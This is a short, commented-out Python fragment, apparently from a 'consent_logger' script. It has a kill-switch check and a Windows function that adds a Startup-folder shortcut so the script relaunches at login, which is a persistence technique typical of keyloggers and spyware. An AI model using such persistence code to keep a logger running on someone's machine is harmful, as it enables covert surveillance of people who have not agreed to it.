# import os
# import sys
# import subprocess
# import shutil

# KILL_SWITCH_PATH = os.path.expanduser("~/.logger_kill")

# def check_kill_switch():
#     """
#     Prevents logger from running if kill-switch file exists.
#     """
#     if os.path.exists(KILL_SWITCH_PATH):
#         print("[!] Kill switch activated. Exiting...")
#         sys.exit(0)

# def add_to_startup():
#     script_path = os.path.abspath(__file__)

#     if os.name == "nt":  
#         # Windows Startup (shortcut method)
#         startup_path = os.path.expandvars(r"C:\Users\Shivraj\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
#         dest_path = os.path.join(startup_path, "consent_logger.lnk")
#         try:
#             import win32com.client
#             shell = win32com.client.Dispatch("WScript.Shell")
#             shortcut = shell.CreateShortCut(dest_path)
#             shortcut.Targetpath = sys.executable
#             shortcut.Arguments = script_path
#             shortcut.WorkingDirectory = os.path.dirname(script_path)
#             shortcut.save()
#             print("[+] Persistence added (Windows Startup)")
#         except Exception as e:
#             print("[-] Could not add persistence (Windows):", e)

